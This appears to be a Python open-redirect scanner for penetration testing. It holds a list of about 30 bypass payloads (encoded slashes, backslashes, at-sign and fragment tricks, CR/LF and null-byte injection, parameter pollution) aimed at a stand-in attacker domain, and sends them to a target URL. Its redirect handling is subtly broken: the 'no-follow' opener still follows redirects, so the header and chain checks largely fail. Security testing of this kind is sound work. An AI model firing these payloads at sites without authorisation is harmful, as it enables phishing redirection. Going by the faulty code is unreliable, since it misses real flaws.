#!/usr/bin/env python3
"""
open_redirect_scanner.py — Open Redirect vulnerability scanner.

Tests common redirect parameters with a suite of bypass payloads.
Follows the redirect chain to detect final destination leaking to evil.com.

Usage:
  python3 tools/open_redirect_scanner.py --target https://app.example.com/login
  python3 tools/open_redirect_scanner.py --target https://app.example.com/ --dry-run
  python3 tools/open_redirect_scanner.py --target https://app.example.com/ --rate 0.5 --json
"""

import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# ─── Color codes ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

FINDINGS = []

# ─── Redirect parameters and payloads ─────────────────────────────────────────

REDIRECT_PARAMS = [
    "url", "redirect", "next", "return", "redir", "destination",
    "continue", "goto", "link", "target", "path", "out", "view",
    "callback", "return_to", "redirect_to", "redirect_uri", "return_url",
]

EVIL_DOMAIN  = "evil-redirect-test.com"
EVIL_URL     = f"https://{EVIL_DOMAIN}"
SAFE_URL     = "https://safe.example.com"

# (payload_template, label)
# Use {evil} as placeholder; will be substituted with EVIL_URL / EVIL_DOMAIN
BYPASS_PAYLOADS = [
    # --- Baseline ---
    ("{evil}",                                  "baseline-https"),
    ("http://{domain}",                         "baseline-http"),
    # --- Protocol-relative ---
    ("//{domain}",                              "protocol-relative"),
    ("//{domain}/path",                         "protocol-relative-path"),
    ("////{domain}",                            "quadruple-slash"),
    # --- Backslash ---
    ("/\\{domain}",                             "backslash-1"),
    ("\\\\{domain}",                            "double-backslash"),
    ("//\\{domain}",                            "slash-backslash"),
    # --- At-sign (username bypass) ---
    ("https://target.com@{domain}",             "at-sign"),
    ("http://target.com:80@{domain}",           "at-sign-port"),
    ("//{domain}@target.com",                   "at-sign-reversed"),
    # --- URL encoding ---
    ("%68%74%74%70%73%3a%2f%2f{domain}",        "url-encoded-full"),
    ("https://{domain}%2f",                     "encoded-trailing-slash"),
    ("%2f%2f{domain}",                          "encoded-double-slash"),
    # --- Double encoding ---
    ("%252f%252f{domain}",                      "double-encoded-slashes"),
    ("https%3A%2F%2F{domain}",                  "encoded-scheme"),
    # --- Tab / newline injection ---
    ("https://{domain}%09",                     "tab-suffix"),
    ("https://{domain}%0a",                     "newline-suffix"),
    ("https://{domain}%0d",                     "cr-suffix"),
    ("%09//{domain}",                           "tab-prefix-double-slash"),
    # --- Fragment bypass ---
    ("https://safe.example.com#{domain}",       "fragment-evil"),
    ("https://safe.example.com/#{domain}",      "fragment-evil-slash"),
    ("/{domain}#safe",                          "path-evil-fragment-safe"),
    # --- Parameter pollution ---
    ("{evil}&redirect=https://safe.example.com","param-pollution-first"),
    ("https://safe.example.com&redirect={evil}","param-pollution-second"),
    # --- Subdomain tricks ---
    ("https://{domain}.safe.example.com",       "subdomain-prefix"),
    ("https://safe.{domain}",                   "subdomain-suffix"),
    # --- Whitespace / null byte ---
    (" {evil}",                                 "leading-space"),
    ("{evil} ",                                 "trailing-space"),
    ("\x00{evil}",                              "null-byte-prefix"),
]


# ─── HTTP Helpers ─────────────────────────────────────────────────────────────

def http_get(url: str, headers: dict | None = None,
              follow_redirects: bool = False,
              timeout: int = 10) -> tuple[int, dict, str]:
    req_headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    if headers:
        req_headers.update(headers)

    opener = urllib.request.build_opener()
    if not follow_redirects:
        opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())

    req = urllib.request.Request(url, headers=req_headers)
    try:
        with opener.open(req, timeout=timeout) as r:
            body = r.read().decode(errors="replace")
            resp_headers = {}
            for k in r.headers:
                resp_headers[k.lower()] = r.headers[k]
            return r.status, resp_headers, body
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        resp_headers = {}
        for k in e.headers:
            resp_headers[k.lower()] = e.headers[k]
        return e.code, resp_headers, body
    except Exception as e:
        return 0, {}, str(e)


def record(test: str, result: str, detail: str, severity: str = "MEDIUM"):
    FINDINGS.append({"test": test, "result": result, "detail": detail, "severity": severity})
    color = RED if result == "VULNERABLE" else (YELLOW if result == "INTERESTING" else GREEN)
    print(f"  {color}[{result}]{RESET} {test}")
    if detail:
        print(f"    {DIM}{detail}{RESET}")


def _build_payload(template: str) -> str:
    """Substitute {evil} and {domain} placeholders."""
    return template.replace("{evil}", EVIL_URL).replace("{domain}", EVIL_DOMAIN)


def _is_redirect_to_evil(headers: dict, body: str) -> str | None:
    """
    Return the redirect destination string if it points at EVIL_DOMAIN,
    else None.  Checks Location header and common meta-refresh / JS redirects
    in body.
    """
    location = headers.get("location", "")
    if location and EVIL_DOMAIN in location:
        return f"Location: {location}"

    # Meta-refresh
    meta_match = re.search(
        r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\']?\d+;\s*url=([^"\'>\s]+)',
        body, re.IGNORECASE
    )
    if meta_match and EVIL_DOMAIN in meta_match.group(1):
        return f"meta-refresh: {meta_match.group(1)}"

    # JavaScript redirect: window.location, document.location
    js_match = re.search(
        r'(?:window|document)\.location(?:\.href)?\s*=\s*["\']([^"\']+)',
        body, re.IGNORECASE
    )
    if js_match and EVIL_DOMAIN in js_match.group(1):
        return f"JS redirect: {js_match.group(1)}"

    return None


def _follow_redirect_chain(url: str, timeout: int = 10) -> tuple[str, list[str]]:
    """
    Manually follow up to 10 redirects and return (final_url, chain_of_locations).
    Returns the final URL and a list of intermediate Location header values.
    """
    chain: list[str] = []
    current = url
    for _ in range(10):
        status, headers, body = http_get(current, follow_redirects=False, timeout=timeout)
        if status in (301, 302, 303, 307, 308):
            loc = headers.get("location", "")
            if not loc:
                break
            chain.append(loc)
            # Resolve relative Location
            current = urllib.parse.urljoin(current, loc)
        else:
            break
    return current, chain


# ─── Test Cases ───────────────────────────────────────────────────────────────

def test_redirect_params_baseline(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[1] Common Redirect Parameters — Baseline{RESET}")
    tested = 0
    for param in REDIRECT_PARAMS:
        test_url = _inject_param(url, param, EVIL_URL)
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} param={param} → {EVIL_URL}")
            tested += 1
            if tested >= 4:
                remaining = len(REDIRECT_PARAMS) - 4
                print(f"  {DIM}... ({remaining} more params){RESET}")
                return
            continue
        time.sleep(1.0 / rate)
        status, headers, body = http_get(test_url, follow_redirects=False)
        hit = _is_redirect_to_evil(headers, body)
        if hit:
            record(f"open-redirect-{param}", "VULNERABLE",
                   f"param={param}, direct redirect: {hit}", "HIGH")


def test_bypass_payloads(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[2] Bypass Technique Payloads{RESET}")
    # Use only the first 3 params to keep request volume reasonable
    for param in REDIRECT_PARAMS[:3]:
        for template, label in BYPASS_PAYLOADS:
            payload = _build_payload(template)
            test_url = _inject_param(url, param, payload)
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} [{label}] param={param}: {payload[:60]}")
                continue
            time.sleep(1.0 / rate)
            status, headers, body = http_get(test_url, follow_redirects=False)
            hit = _is_redirect_to_evil(headers, body)
            if hit:
                record(f"open-redirect-bypass-{label}", "VULNERABLE",
                       f"param={param}, bypass={label}: {hit}", "HIGH")
    if not dry_run:
        print(f"  {DIM}Bypass sweep complete{RESET}")


def test_redirect_chain(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[3] Redirect Chain Analysis{RESET}")
    for param in REDIRECT_PARAMS[:5]:
        for template, label in [
            ("{evil}", "baseline"),
            ("//{domain}", "protocol-relative"),
            ("/\\{domain}", "backslash"),
        ]:
            payload = _build_payload(template)
            test_url = _inject_param(url, param, payload)
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} Chain follow: param={param} [{label}]")
                continue
            time.sleep(1.0 / rate)
            final_url, chain = _follow_redirect_chain(test_url)
            if EVIL_DOMAIN in final_url or any(EVIL_DOMAIN in loc for loc in chain):
                record(f"open-redirect-chain-{param}-{label}", "VULNERABLE",
                       f"Redirect chain leads to {EVIL_DOMAIN}: "
                       f"chain={' → '.join(chain[:5])}", "HIGH")
    if not dry_run:
        print(f"  {DIM}Redirect chain analysis complete{RESET}")


def test_param_pollution(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[4] HTTP Parameter Pollution{RESET}")
    # Send the same redirect param twice with conflicting values
    for param in REDIRECT_PARAMS[:4]:
        parsed = urllib.parse.urlparse(url)
        # Duplicate param: evil first, safe second — tests first-value-wins
        qs = urllib.parse.urlencode(
            [(param, EVIL_URL), (param, SAFE_URL)]
        )
        test_url = urllib.parse.urlunparse(parsed._replace(query=qs))
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} HPP: param={param} evil+safe")
            continue
        time.sleep(1.0 / rate)
        status, headers, body = http_get(test_url, follow_redirects=False)
        hit = _is_redirect_to_evil(headers, body)
        if hit:
            record(f"open-redirect-hpp-{param}", "VULNERABLE",
                   f"HPP first-value wins: param={param}, {hit}", "HIGH")

        # Reversed order: safe first, evil second — tests last-value-wins
        qs_rev = urllib.parse.urlencode(
            [(param, SAFE_URL), (param, EVIL_URL)]
        )
        test_url_rev = urllib.parse.urlunparse(parsed._replace(query=qs_rev))
        time.sleep(1.0 / rate)
        status, headers, body = http_get(test_url_rev, follow_redirects=False)
        hit = _is_redirect_to_evil(headers, body)
        if hit:
            record(f"open-redirect-hpp-last-{param}", "VULNERABLE",
                   f"HPP last-value wins: param={param}, {hit}", "HIGH")
    if not dry_run:
        print(f"  {DIM}HPP sweep complete{RESET}")


def print_payload_table():
    print(f"\n{BOLD}Open Redirect Bypass Reference:{RESET}")
    shown = BYPASS_PAYLOADS[:10]
    for template, label in shown:
        sample = _build_payload(template)
        print(f"  {DIM}{label:35s} {sample[:60]}{RESET}")
    if len(BYPASS_PAYLOADS) > 10:
        print(f"  {DIM}... and {len(BYPASS_PAYLOADS) - 10} more bypass techniques{RESET}")


def _inject_param(url: str, param: str, value: str) -> str:
    """Return URL with param set to value, replacing existing if present."""
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Open Redirect vulnerability scanner")
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("--target", metavar="URL", help="Target URL to test")
    target_group.add_argument("--url",    metavar="URL", help="Alias for --target")
    parser.add_argument("--url-list", metavar="FILE",
                        help="File of URLs to test (one per line)")
    parser.add_argument("--rate",    type=float, default=1.0, metavar="REQ/S",
                        help="Request rate limit in req/sec (default: 1.0)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show payloads without sending requests")
    parser.add_argument("--json",    action="store_true", dest="json_output",
                        help="Output results as JSON")
    args = parser.parse_args()

    target = args.target or args.url

    targets = [target]
    if args.url_list:
        try:
            with open(args.url_list) as fh:
                for line in fh:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except OSError as e:
            print(f"{RED}[ERROR]{RESET} Cannot read --url-list: {e}", file=sys.stderr)
            sys.exit(1)

    for url in targets:
        print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════╗")
        print(f"║   Open Redirect Scanner              ║")
        print(f"╚══════════════════════════════════════╝{RESET}")
        print(f"  Target : {CYAN}{url}{RESET}")
        print(f"  Rate   : {args.rate} req/sec")
        if args.dry_run:
            print(f"  Mode   : {YELLOW}DRY-RUN (no requests sent){RESET}")

        print_payload_table()

        test_redirect_params_baseline(url, args.rate, args.dry_run)
        test_bypass_payloads(url, args.rate, args.dry_run)
        test_redirect_chain(url, args.rate, args.dry_run)
        test_param_pollution(url, args.rate, args.dry_run)

    vulns = [f for f in FINDINGS if f["result"] == "VULNERABLE"]
    print(f"\n{BOLD}{'─'*50}{RESET}")
    print(f"  Tests run  : {len(FINDINGS)}")
    if vulns:
        print(f"  {RED}Vulnerable : {len(vulns)}{RESET}")
        for f in vulns:
            sev = f.get("severity", "")
            print(f"    {RED}→{RESET} [{sev}] {f['test']}: {f['detail']}")
    else:
        print(f"  {GREEN}Vulnerable : 0{RESET}")

    if args.json_output:
        print(json.dumps({"targets": targets, "findings": FINDINGS}, indent=2))


if __name__ == "__main__":
    main()
